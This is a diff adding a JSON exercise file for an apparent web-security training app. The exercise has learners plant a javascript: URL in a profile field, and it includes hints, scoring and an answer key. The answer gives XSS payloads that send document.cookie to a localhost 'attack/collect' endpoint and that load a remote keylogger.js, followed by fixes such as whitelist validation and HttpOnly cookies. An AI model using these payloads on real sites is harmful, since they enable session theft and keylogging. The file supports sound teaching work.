@@ -1,0 +1,18 @@
+{
+  "title": "URL Validation (easy)",
+  "category": "URL", 
+  "task": "<p>Open the <a href='./webapp/test/testService.html#/Post/PostID_11' target='_blank'>BuletinBoard app.</a></p><p>Notice that your Profile (accessed from top-right icon) <a href='img/toProfile.jpg' target='_blank'><img src='img/toProfile.jpg' style='height:3rem'/></a> has URL field <a href='img/profileUrl.jpg' target='_blank'><img src='img/profileUrl.jpg' style='height:3rem'/></a>. <p>When you enter comments bellow a post, a link to that URL appears (as <b>link icon</b>) bellow each comment. <a href='img/profileUrlIcon.jpg' target='_blank'><img src='img/profileUrlIcon.jpg' style='height:3rem'/></a> <p><b>Task:</b> <p> <b> In your profile, change the URL to one that contains a script</b> <br>(such that anyone who later clicks on the associated icon bellow your comment <a href='img/profileUrlIcon.jpg' target='_blank'><img src='img/profileUrlIcon.jpg' style='height:3rem'/></a> actually triggers the script execution.)</p><p>The script to insert: <p> it can be simply <b>alert()</b> or script that sends the session cookie to http://localhost:3001/api/attack/collect?coolkie=</p>",
+  "hints": ["<p>How do you specify that a URL is actually a javascript code to be executed?</p>",
+            "<p>Check the <a href='https://docstore.mik.ua/orelly/web/jscript/ch10_04.html' target='_blank'>javascript: preudo protocol</a></p>",
+            "<p>Open a new browser tab and type <b>javascript:alert('Hello World!')</b> into the browser address bar.</p><p>To copy/paste, you <a href='https://stackoverflow.com/questions/7698009/javascript-stripped-from-url-bar' target='_blank'>need to</a> <b>type</b> the first letter only and paste the rest."],
+  "answer": "<p><b>To exploit:</b> <p>You can enter URL value: <span style='color:red'>javascript:alert()</span> or e.g.<span style='color:red'>javascript:window.location='http://localhost:3001/api/attack/collect?coolkie='+document.cookie </span> </p><p><b>To fix:</b><p><a href='https://sapui5.hana.ondemand.com/#/topic/91f3768f6f4d1014b6dd926db0e91070.html' target='_blank'>URL validation against a whitelist</a> (<b> UI5 app</b> duty and the solution to test for this task)<p><p><b>Other ways to fix/mitigate:</b></p><ul><li>Server-side validation<li>The web server could detect a simultaneous login and invalidate the sessions.<li>The web server could detect a simultaneous login from two different IP addresses and invalidate the sessions.<li>Set cookie with HttpOnly flag to prevent access from JavaScript.</ul><p><b>Other possible exploits:</b></p><p>The exploit possibilities are numerous. Among these are:</p><ul><li><p>Leak (to the attacker server) any information currently displayed on the screen</li><li><p>Send new requests to the server (on behalf of the user) within the current session</li><li><p>Download script to execute background task, e.g.: <span style='color:red'>javascript:var oScriptTag = document.createElement('script');oScriptTag.src = 'http://localhost:3001/api/attack/keylogger.js';document.head.appendChild(oScriptTag)</span></li><li><p>Request resource from an attacker service that is protected with BasicAthentication => the default browser prompt will be automatically opened and steal user credentials</li></ul>",
+  "app": {
+    "mainURL": "./webapp/test/testService.html#/Post/PostID_11",
+    "editURL": "./webapp/controller/Profile.controller.js",
+    "testURL": "./webapp/test/testService.html#/Profile/gamer"
+  },
+  "score": {
+    "success": 5,
+    "answer": 5
+  }
+}
